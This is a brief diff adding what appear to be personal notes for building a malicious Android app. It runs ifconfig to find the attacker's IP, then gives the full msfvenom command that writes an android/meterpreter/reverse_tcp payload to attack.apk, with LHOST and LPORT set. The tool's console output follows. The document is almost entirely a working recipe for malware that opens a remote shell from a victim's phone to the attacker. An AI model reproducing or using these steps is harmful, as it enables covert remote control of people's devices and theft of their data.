@@ -1,0 +1,15 @@
+cd Desktop
+
+msfvenom -h
+
+ifconfig
+
+choose one wlan0, eth inet is IP Address
+
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.153.128 LPORT=4444 R > attack.apk
+
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10238 bytes
